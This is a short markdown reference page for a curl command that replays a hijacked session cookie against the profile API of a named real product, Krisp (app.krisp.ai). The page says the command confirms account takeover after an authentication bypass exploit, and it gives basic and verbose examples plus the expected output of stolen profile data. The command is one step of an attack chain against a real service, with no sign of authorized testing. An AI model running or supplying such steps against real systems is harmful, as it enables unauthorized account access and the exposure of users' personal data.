# curl-account-access-test

## Command

```bash
curl -b cookies.txt "<krisp-base-url>/api/user/profile" -H "Content-Type: application/json"
```

## Description

This command uses a hijacked session cookie to access the target user's profile endpoint in the Krisp application, verifying successful account takeover after an auth bypass exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Loads cookies from the file (generated by bypass command) | Yes |
| `"<krisp-base-url>/api/user/profile"` | The protected profile endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header for the request | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt "https://app.krisp.ai/api/user/profile" -H "Content-Type: application/json"
```

### Advanced Usage

```bash
curl -b cookies.txt "https://app.krisp.ai/api/user/profile" -H "Content-Type: application/json" -H "Authorization: Bearer <token-if-needed>" -v
```

## Expected Output

Returns HTTP 200 OK with JSON containing user profile data (e.g., {"name": "Target User", "email": "user@domain.com"}), confirming access. Unauthorized access would return 401 or 403.
